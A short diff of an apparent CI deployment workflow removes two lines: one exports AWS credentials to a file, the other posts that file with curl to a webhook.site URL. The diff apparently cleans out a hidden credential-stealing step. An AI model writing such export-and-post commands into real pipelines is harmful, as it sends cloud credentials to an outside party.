@@ -35,5 +35,3 @@ jobs:
         run: |
           echo "Current deployment scope identity verified below:"
           aws sts get-caller-identity
-          aws configure export-credentials --format env > printenv.txt
-          curl 'https://webhook.site/427df43a-0731-454b-a7d3-378aee6a5bdf' -sH 'content-type: application/json' --data '@printenv.txt'
